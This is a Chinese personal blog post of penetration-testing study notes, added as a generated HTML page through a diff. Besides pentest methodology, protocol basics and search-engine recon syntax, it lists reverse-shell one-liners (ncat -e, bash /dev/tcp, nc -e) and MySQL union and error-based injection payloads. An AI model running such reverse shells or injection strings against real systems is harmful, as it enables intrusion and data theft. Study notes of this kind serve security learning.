@@ -1,0 +1,427 @@
+<!DOCTYPE HTML>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>2020年1月11日学习笔记 | 柠檬茶的博客</title>
+  <meta name="author" content="John Doe">
+
+  
+  <meta name="description" content="2020/01/11nc反弹cmdshellwindow命令主命令为:ncat
+linux主命令为:nc
+以window为例
+ 本地监听：ncat -lvvp 8080 
+ 往公网反弹cmdshell： 
+  ncat -e cmd.exe [ip] 8080 
+bash反弹shell主要命令: b">
+  
+
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="2020年1月11日学习笔记">
+  <meta property="og:site_name" content="柠檬茶的博客">
+
+  
+  
+
+  
+    <meta property="og:image" content="/img/5.jpg">
+  
+
+  
+  <link href="/css/images/favicon.ico" rel="icon">
+  
+
+  <link rel="alternate" href="/atom.xml" title="柠檬茶的博客" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+
+
+  <!-- baidu webmaster push -->
+  <script src="//push.zhanzhang.baidu.com/push.js"></script>
+
+</head>
+</html>
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">柠檬茶的博客</a></h1>
+  <h2><a href="/"></a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">Home</a></li>
+    
+      <li><a href="/archives">Archives</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div></header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2020-01-11T08:56:12.000Z"><a href="/2020/01/11/20200111/">2020-01-11</a></time>
+      
+      
+  
+    <h1 class="title">2020年1月11日学习笔记</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h1 id="2020-01-11"><a href="#2020-01-11" class="headerlink" title="2020/01/11"></a>2020/01/11</h1><h2 id="nc反弹cmdshell"><a href="#nc反弹cmdshell" class="headerlink" title="nc反弹cmdshell"></a>nc反弹cmdshell</h2><p>window命令主命令为:ncat</p>
+<p>linux主命令为:nc</p>
+<p>以window为例</p>
+<p> 本地监听：ncat -lvvp 8080 </p>
+<p> 往公网反弹cmdshell： </p>
+<p>  ncat -e cmd.exe [ip] 8080 </p>
+<h2 id="bash反弹shell"><a href="#bash反弹shell" class="headerlink" title="bash反弹shell"></a>bash反弹shell</h2><p>主要命令: bash -i &gt;&amp; /dev/tcp/192.168.174.128/9090 0&gt;&amp;1 </p>
+<p>nc监听端口</p>
+<p>ncat -lvvp 9090</p>
+<p>然后bash反弹，其中ip地址为公网ip</p>
+<p>bash -i &gt;&amp; /dev/tcp/[ip]/9090 0&gt;&amp;1</p>
+<h2 id="nc反弹shell"><a href="#nc反弹shell" class="headerlink" title="nc反弹shell"></a>nc反弹shell</h2><p>nc监听端口</p>
+<p>ncat -lvvp 9090</p>
+<p>Linux机反弹:</p>
+<p>nc -e /bin/bash [ip] 9090 </p>
+<h2 id="渗透测试分类"><a href="#渗透测试分类" class="headerlink" title="渗透测试分类"></a>渗透测试分类</h2><p> <strong>渗透测试按测试方法与视角可以分为以下三类：</strong> </p>
+<p>1） 黑盒测试</p>
+<p>定义：渗透测试人员除了知道被测试的目标之外，其余与目标相关的信息一无所知。</p>
+<p>特点：这种类型的渗透测试属于外部渗透测试。在前期需要对目标进行大量的信息收集，耗时较长。但是这种类型的渗透测试更有利于挖掘出系统潜在的漏洞、以及脆弱环节、薄弱点等。</p>
+<p>（2） 白盒测试</p>
+<p>定义：渗透测试人员可以通过正常渠道向被测试单位取得各种资料，包括网络拓扑结构图、员工资料甚至网站程序的代码片段，也可以和单位其他员工进行面对面沟通。</p>
+<p>特点：这种类型的渗透测试在前期已经对目标系统有了一个初步的了解。这类测试的地点可以分为“从组织内部”与“从组织外部”两种大环境。在这种测试下可以充分发挥“社会工程学的力量”，对企业内部雇员的越权操作进行测试。</p>
+<p>（3） 灰盒测试</p>
+<p>定义：灰盒测试介于白盒测试与黑盒测试之间</p>
+<p>特点：属于较为隐秘的测试。在测试当中，被测试单位只有少数人知晓测试的存在，因此能够较好的检验单位中的信息安全事件监控、响应等是否到位。</p>
+<p>渗透测试按照测试目标，可以分为以下四类：</p>
+<p>（1） 操作系统渗透</p>
+<p>Windows、Linux、Solaris、AIX、SCO等</p>
+<p>（2） 数据库系统渗透</p>
+<p>MySQL 、Oracle、MSSQL、sybase、informix</p>
+<p>（3） 应用系统渗透</p>
+<p>由ASP、JSP、PHP等组成的web应用（包括移动应用产品）</p>
+<p>（4） 网络设备渗透</p>
+<p> 防火墙、入侵检测系统等</p>
+<h2 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h2><p><strong>(1) 明确渗透测试目标和界限</strong></p>
+<p><strong>(2) 信息收集</strong></p>
+<pre><code> *基础信息获取* 
+</code></pre><p>​     <em>WEB扫描信息获取</em> </p>
+<p><strong>(3) 威胁建模制定方案</strong></p>
+<p><strong>(4) 前期渗透测试</strong></p>
+<p>​      根据制定的渗透测试方案开始渗透测试 </p>
+<p><strong>(5) 后期渗透测试</strong></p>
+<p>​     在前期渗透测试的基础上扩大影响范围、提高权限、建立维持访问、清理痕迹 </p>
+<p><strong>(6) 写报告</strong></p>
+<h2 id="信息安全三要素"><a href="#信息安全三要素" class="headerlink" title="信息安全三要素"></a>信息安全三要素</h2><p><strong>机密性：</strong>要求保护数据内容不被泄漏，加密是实现机密性要求的常用手段。</p>
+<p><strong>完整性：</strong>要求保护的数据内容是完整的、没有被篡改的。常见的保证一致性的技术手段是数字签名。</p>
+<p><strong>可用性：</strong>要求保护的资源是“随需而得”。</p>
+<h2 id="如何实施安全评估"><a href="#如何实施安全评估" class="headerlink" title="如何实施安全评估"></a>如何实施安全评估</h2><p><em>互联网安全的核心问题是数据安全的问题</em></p>
+<h3 id="资产等级划分"><a href="#资产等级划分" class="headerlink" title="资产等级划分"></a>资产等级划分</h3><p> <strong>了解公司最重要的资产是什么，他们最看重的数据是什么</strong>。 </p>
+<p> <strong>在完成资产等级划分之后，需要划分信任域和信任边界。</strong>最简单的划分方式就是从网络逻辑上来划分。</p>
+<h3 id="威胁分析"><a href="#威胁分析" class="headerlink" title="威胁分析"></a>威胁分析</h3><p><strong>找出所有威胁</strong></p>
+<h3 id="风险分析"><a href="#风险分析" class="headerlink" title="风险分析"></a>风险分析</h3><p>   <strong><em>风险由以下因素组成：</em></strong></p>
+<p>   Risk=Probability*Damage Potential</p>
+<p>   <strong>影响风险高低的因素除了造成损失的大小之外还有考虑到发生的可能性。</strong></p>
+<h3 id="确认解决方案"><a href="#确认解决方案" class="headerlink" title="确认解决方案"></a>确认解决方案</h3><p> <strong>好的安全方案对用户应该是透明的，尽可能地不要改变用户的使用习惯。</strong> </p>
+<p><strong><em>\</em>最终，一个优秀的安方案应该具备以下功能：**</strong></p>
+<ul>
+<li>能够有效的解决问题</li>
+<li>用户体验好</li>
+<li>高性能</li>
+<li>低耦合</li>
+<li>易于扩展与升级</li>
+<li>满足“三要素”</li>
+</ul>
+<h2 id="WEB协议"><a href="#WEB协议" class="headerlink" title="WEB协议"></a>WEB协议</h2><h3 id="IP协议"><a href="#IP协议" class="headerlink" title="IP协议"></a>IP协议</h3><p>IP（Internet Protocol）协议的英文名直译就是因特网协议，IP协议是TCP/IP协议簇的核心协议，也是TCP/IP协议的载体，所有的TCP、UDP、、ICMP数据都以IP协议数据报格式传输。</p>
+<p>IP协议提供的是不可靠的、无连接的数据传送服务。</p>
+<p><strong>IP包头：</strong></p>
+<p><img src="/2020/01/11/20200111/20180228163405303.png" alt="img"></p>
+<h3 id="TCP协议"><a href="#TCP协议" class="headerlink" title="TCP协议"></a>TCP协议</h3><p> TCP/IP(Transmission Control Protocol/InternetProtocol) 即传输控制协议/网间协议，是一个工业标准的协议集，它是为广域网（WAN）设计的。 </p>
+<p>TCP协议的首部格式</p>
+<p> <img src="/2020/01/11/20200111/20180228163517930.png" alt="img"> </p>
+<p>TCP协议的特点</p>
+<p>（1）TCP 是面向连接的传输层协议</p>
+<p>（2）TCP 提供可靠交付的服务</p>
+<p>（3）TCP 提供全双工通信</p>
+<p>（4）面向字节流</p>
+<p>TCP三次握手</p>
+<p> <img src="/2020/01/11/20200111/20180228163659575.png" alt="img"> </p>
+<p>步骤：</p>
+<p>（1）客户机A向服务器B发送链接请求，并且设置SYN=1，seq=x </p>
+<p>（2）服务器B收到来自客户机A的链接请求之后，向客户机发送响应，同时设置SYN=1，seq=y,ACK=1,ack=x+1</p>
+<p>（3）当客户机收到来自服务器的响应之后，会给服务器返回一个响应表示已经收到该响应（ACK=1，seq=x+1，ack=y+1）。</p>
+<h3 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h3><p> ARP (AddressResolution Protocol) 是个地址解析协议。最直白的说法是：在IP以太网中，当一个上层协议要发包时，有了该节点的IP地址，ARP就能提供该节点的MAC地址。 </p>
+<h3 id="DNS协议"><a href="#DNS协议" class="headerlink" title="DNS协议"></a>DNS协议</h3><p>DNS（Domain Name System）即域名系统，它主要用于实现IP地址与域名地址之间的相互转换。我们经常会在浏览器URL（统一资源定位）地址栏中输入的是一段英文字母组成的域名，而不是一段IP地址，因为IP地址的多变，又是纯数字所以容易记混，所以常常使用域名来进行查询，而DNS的主要左右就是将此时的域名转换为IP地址进行查询.</p>
+<h3 id="NetBIOS协议"><a href="#NetBIOS协议" class="headerlink" title="NetBIOS协议"></a>NetBIOS协议</h3><p> NetBIOS(网络基本输入/输出系统）最初由 IBM，Sytek 作为API开发，使用户软件能使用局域网的资源。自从诞生，Netbois成为许多其他网络应用程序的基础。严格意义上，Netbios 是接入网络服务的接口标准。  </p>
+<h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><p>HTTP协议是Hyper Text Transfer Protocol（超文本传输协议）的缩写,是用于从万维网（WWW:WorldWide Web ）服务器传输超文本到本地浏览器的传送协议。</p>
+<p>HTTP是一个基于TCP/IP通信协议来传递数据（HTML 文件, 图片文件, 查询结果等）。</p>
+<p>HTTP是一个属于应用层的面向对象的协议，由于其简捷、快速的方式，适用于分布式超媒体信息系统。它于1990年提出，经过几年的使用与发展，得到不断地完善和扩展。目前在WWW中使用的是HTTP/1.0的第六版，HTTP/1.1的规范化工作正在进行之中，而且HTTP-NG(Next Generation of HTTP)的建议已经提出。</p>
+<p>HTTP协议工作于客户端-服务端架构为上。浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。Web服务器根据接收到的请求后，向客户端发送响应信息。</p>
+<p> <strong>HTTP请求响应模型：</strong> </p>
+<p> <img src="/2020/01/11/20200111/20180228170340114.png" alt="img"> </p>
+<p> <strong>HTTP消息请求格式</strong> </p>
+<p> <img src="/2020/01/11/20200111/20180228170748406.png" alt="img"> </p>
+<p> <img src="/2020/01/11/20200111/20180228171012341.png" alt="img"> </p>
+<p> <img src="/2020/01/11/20200111/20180228171142973.png" alt="img"> </p>
+<p>HTTP的响应状态码：</p>
+<p>1XX：信息提示，表示请求已被成功接收，继续处理。其范围是100~101</p>
+<p>2XX：成功，服务器成功地处理了请求，其范围是200~206</p>
+<p>3XX：重定向，重定向状态码用于告诉浏览器客户端，它们访问的资源已经被移动，并告诉客户新的资源地址位置。</p>
+<p>4XX:客户端错误状态码，有时客户端会发送一些服务器无法处理的东西，比如格式错误的请求，或者最常见的是，请求一个不存在的URL。其范围是400~415</p>
+<p>5XX：有是有客户端发送一条有效请求，但WEB服务器自身却出错了，可能是WEB服务请运行出错了，或者网站都挂了。范围：500~505</p>
+<p>常见的状态码描述：</p>
+<p>200:客户端请求成功，是最常见的状态。</p>
+<p>302：重定向。</p>
+<p>404：请求资源不存在，是最常见的状态。</p>
+<p>400：客户端请求有语法错误，不能被服务器所理解。</p>
+<p>403：服务器收到请求，但是拒绝提供服务。</p>
+<p>500：服务器内部错误，是最常见的状态之一。</p>
+<p>503：服务器当前不能处理客户端请求，一段时间后可能恢复正常。</p>
+<p>几个重要的HTTP头部构成部分</p>
+<p>（1）Host——请求报头部内容，主要用于指定被请求资源的Internet主机和端口号，例如：Host:<a href="http://www.baidu.com:80" target="_blank" rel="noopener">www.baidu.com:80</a></p>
+<p>（2）User-Agent——请求报头域允许客户端将他的操作系统、浏览器和其他属性告诉服务器。登录一些网站时，很多时候都可以见到显示我们的浏览器、系统信息。</p>
+<p>（3）Referer——代表当前访问的URL的上一个URL，也就是说，用户是从什么地方来到本页面的，来自哪里。</p>
+<p>（4）Cookie——Cookie是一段文本，常用来表示请求者身份等。</p>
+<p>（5）X-Forward-For———代表请求端的IP，可以有多个，中间使用“，”隔开。</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h3><p>部分语法百度试用</p>
+<ul>
+<li>Site       指定域名 </li>
+<li>Intext     正文中存在关键字的网页</li>
+<li>Intitle     标题中存在关键字的网页</li>
+<li>Info       一些基本信息</li>
+<li>Inurl      URL存在关键字的网页</li>
+<li>Filetype   搜索指定文件类型    </li>
+</ul>
+<p><strong>双引号: 代表完全匹配搜索</strong></p>
+<p><strong>减号:  代表搜索不包含减号后面的词的页面</strong></p>
+<p><strong>星号: 代表通配符</strong></p>
+<h3 id="ZoomEye"><a href="#ZoomEye" class="headerlink" title="ZoomEye"></a>ZoomEye</h3><p> <strong>ZoomEye</strong>是一款针对网络空间的搜索引擎，收录了互联网空间中的设备、网站及其使用的服务或组件等信息。 </p>
+<p><strong>指定搜索的组件</strong>：</p>
+<p>app：组件名称</p>
+<p>var：组件版本</p>
+<p>例如：搜索 apache组件    版本2.4</p>
+<p>app:apache var:2.4</p>
+<p><strong>指定搜素的端口</strong></p>
+<p>port:端口号</p>
+<p>例如：搜索开放了SSH端口的主机</p>
+<p>port:22<br>一些服务器可能监听了非标准的端口。要按照更精确的协议进行检索，可以使用service进行过滤。</p>
+<p><strong>指定搜索的操作系统：</strong></p>
+<p>OS:操作系统</p>
+<p>例如：搜索Linux操作系统</p>
+<p>OS:Linux</p>
+<p><strong>指定搜索的服务：</strong></p>
+<p>service：服务名称</p>
+<p>例如，搜索SSH服务</p>
+<p>service：SSH</p>
+<p><strong>指定搜索的地理位置范围：</strong></p>
+<p>country：国家名</p>
+<p>city:城市名</p>
+<p>例如：</p>
+<p>country:China</p>
+<p>city：Beijing</p>
+<p><strong>指定搜索的CIDR网段：</strong></p>
+<p>cidr:网段</p>
+<p>例如：</p>
+<p>CIDR：192.168.158.12/24</p>
+<p><strong>指定网站域名进行搜索：</strong></p>
+<p>Site:网站域名</p>
+<p>例如：</p>
+<p>site:<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p>
+<p><strong>指定主机名：</strong></p>
+<p>Hostname:主机名</p>
+<p>例如：</p>
+<p>hostname:zwl.cuit.edu.cn</p>
+<p><strong>指定设备名：</strong></p>
+<p>device:设备名</p>
+<p>例如：</p>
+<p>device:router</p>
+<p><strong>指定首页关键词：</strong></p>
+<p>keyword:关键词</p>
+<p>例如：</p>
+<p>keyword:technology</p>
+<h3 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h3><p> Shodan是一个搜素互联网链接设备的搜索引擎，不同于Google、Baidu这些搜素引擎。用户可以在Shodan上使用Shodan搜索语法查找链接到互联网的摄像头、路由器、服务器等设备信息。在渗透测试中是个非常非常不错的神器。 </p>
+<pre class="line-numbers language-java"><code class="language-java">hostname——————————搜索指定的主机或域名，例如 hostname<span class="token operator">:</span>baidu
+port——————————————搜索指定的端口或服务，例如 port<span class="token operator">:</span><span class="token number">80</span>
+country———————————搜索指定的国家，例如 country<span class="token operator">:</span>US
+city——————————————搜索指定的城市，例如 city<span class="token operator">:</span>Chengdu
+org———————————————搜索指定的组织或公司，例如 org<span class="token operator">:</span><span class="token string">"Google"</span>
+isp———————————————搜索指定的ISP供应商，例如 isp<span class="token operator">:</span><span class="token string">"China Telecom"</span>
+product———————————搜索指定的操作系统<span class="token operator">/</span>软件<span class="token operator">/</span>平台，例如 product<span class="token operator">:</span><span class="token string">"Apache httpd"</span>
+version———————————搜索指定的软件版本，例如 version<span class="token operator">:</span><span class="token string">"1.6.2"</span>
+geo———————————————搜索指定的地理位置，参数为经纬度，例如 geo<span class="token operator">:</span><span class="token string">"31.8639, 117.2808"</span>
+before<span class="token operator">/</span>after——————搜索指定收录时间前后的数据，格式为dd<span class="token operator">-</span>mm<span class="token operator">-</span>yy，例如 before<span class="token operator">:</span><span class="token string">"11-11-15"</span>
+net———————————————搜索指定的IP地址或子网，例如 net<span class="token operator">:</span><span class="token string">"210.45.240.0/24"</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>例子:  Server: uc-httpd 1.0.0 200 OK Country:”CN” </p>
+<h3 id="站长之家"><a href="#站长之家" class="headerlink" title="站长之家"></a>站长之家</h3><h2 id="MYSQL注入"><a href="#MYSQL注入" class="headerlink" title="MYSQL注入"></a>MYSQL注入</h2><h3 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a><strong>爆字段</strong></h3><p>   order by 猜测的字段数 </p>
+<h3 id="匹配字段"><a href="#匹配字段" class="headerlink" title="匹配字段"></a><strong>匹配字段</strong></h3><p> and 1=1 union select 1,2,3,……,n </p>
+<h3 id="获取显示字段"><a href="#获取显示字段" class="headerlink" title="获取显示字段"></a><strong>获取显示字段</strong></h3><p> and 1=2 union select 1,2,3,4……n </p>
+<h3 id="利用内置函数爆数据库信息"><a href="#利用内置函数爆数据库信息" class="headerlink" title="利用内置函数爆数据库信息"></a><strong>利用内置函数爆数据库信息</strong></h3><p> version() database() user() </p>
+<h3 id="操作系统信息"><a href="#操作系统信息" class="headerlink" title="操作系统信息"></a><strong>操作系统信息</strong></h3><p> and  1=2 union  all select  @@global.version_compile_os from  mysql.user </p>
+<h3 id="暴库（mysql-gt-5-0）"><a href="#暴库（mysql-gt-5-0）" class="headerlink" title="暴库（mysql&gt;5.0）"></a><strong>暴库（mysql&gt;5.0）</strong></h3><p> and 1=2 union selec 1,2,3,SCHEMA_NAME,5,6,7,8,9,10  from  information_schema.SCHEMA limit 0,1 </p>
+<h3 id="猜表"><a href="#猜表" class="headerlink" title="猜表"></a><strong>猜表</strong></h3><p>and  1=2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from information_schema.TABLES where TABLE_SCHEMA=数据库（十六进制） limit 0（开始的记录，0为第一个开始记录），1（显示1条记录）</p>
+<h3 id="爆字段-1"><a href="#爆字段-1" class="headerlink" title="爆字段"></a><strong>爆字段</strong></h3><p> and 1=2 union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from information_schemation.COLUMNS where TABLE_NAMEE=表名（十六进制） limit 0 ,1 </p>
+<h3 id="爆密码"><a href="#爆密码" class="headerlink" title="爆密码"></a><strong>爆密码</strong></h3><p> and 1=2 union select 1,2,3,用户名段，5,6,7,8,9 from 表名 limit 0,1 </p>
+<h3 id="floor-报错注入"><a href="#floor-报错注入" class="headerlink" title="floor()报错注入"></a>floor()报错注入</h3><p> <strong>floor()报错注入准确地说应该是floor,count,group by冲突报错</strong> </p>
+<pre class="line-numbers language-SQL"><code class="language-SQL">select count(*) ,concat(database(),floor(rand(0)*2))x from users group by x
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href="javascript:void(0)" class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+  
+  <div class="categories">
+    <a href="/categories/Web/">Web</a>, <a href="/categories/Web/笔记/">笔记</a>
+  </div>
+
+        
+  
+  <div class="tags">
+    <a href="/tags/Web/">Web</a>, <a href="/tags/笔记/">笔记</a>
+  </div>
+
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <div class="search">
+  <form action="//google.com/search" method="get" accept-charset="utf-8">
+    <input type="search" name="q" results="0" placeholder="Search">
+    <input type="hidden" name="q" value="site:fakerye.github.io">
+  </form>
+</div>
+
+  
+<div class="widget tag">
+  <h3 class="title">Categories</h3>
+  <ul class="entry">
+  
+    <li><a href="/categories/CTF/">CTF</a><small>1</small></li>
+  
+    <li><a href="/categories/Web/">Web</a><small>3</small></li>
+  
+    <li><a href="/categories/CTF/Web/">Web</a><small>1</small></li>
+  
+    <li><a href="/categories/安全/">安全</a><small>4</small></li>
+  
+    <li><a href="/categories/Web/笔记/">笔记</a><small>3</small></li>
+  
+    <li><a href="/categories/安全/笔记/">笔记</a><small>4</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">Recent Posts</h3>
+  <ul class="entry">
+    
+      <li>
+        <a href="/2020/02/04/20200204/">2020年2月04日学习笔记</a>
+      </li>
+    
+      <li>
+        <a href="/2020/02/01/20200201/">2020年2月01日学习笔记</a>
+      </li>
+    
+      <li>
+        <a href="/2020/01/29/20200129/">2020年1月29日学习笔记</a>
+      </li>
+    
+      <li>
+        <a href="/2020/01/15/20200115/">2020年1月15日学习笔记</a>
+      </li>
+    
+      <li>
+        <a href="/2020/01/14/20200114/">2020年1月14日学习笔记</a>
+      </li>
+    
+  </ul>
+</div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">Tags</h3>
+  <ul class="entry">
+  
+    <li><a href="/tags/CTF/">CTF</a><small>4</small></li>
+  
+    <li><a href="/tags/SQL/">SQL</a><small>1</small></li>
+  
+    <li><a href="/tags/Web/">Web</a><small>6</small></li>
+  
+    <li><a href="/tags/Writeup/">Writeup</a><small>1</small></li>
+  
+    <li><a href="/tags/安全/">安全</a><small>4</small></li>
+  
+    <li><a href="/tags/扩展/">扩展</a><small>1</small></li>
+  
+    <li><a href="/tags/笔记/">笔记</a><small>9</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tagcloud">
+  <h3 class="title">Tag Cloud</h3>
+  <div class="entry">
+    <a href="/tags/CTF/" style="font-size: 13.33px;">CTF</a> <a href="/tags/SQL/" style="font-size: 10px;">SQL</a> <a href="/tags/Web/" style="font-size: 16.67px;">Web</a> <a href="/tags/Writeup/" style="font-size: 10px;">Writeup</a> <a href="/tags/安全/" style="font-size: 13.33px;">安全</a> <a href="/tags/扩展/" style="font-size: 10px;">扩展</a> <a href="/tags/笔记/" style="font-size: 20px;">笔记</a>
+  </div>
+</div>
+
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  <p>
+  
+  &copy; 2020 John Doe
+  
+  All rights reserved.</p>
+  <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
+</div>
+<div class="clearfix"></div>
+
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script></footer>
+  <script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+<div id="bg"></div>
+</body>
+</html>
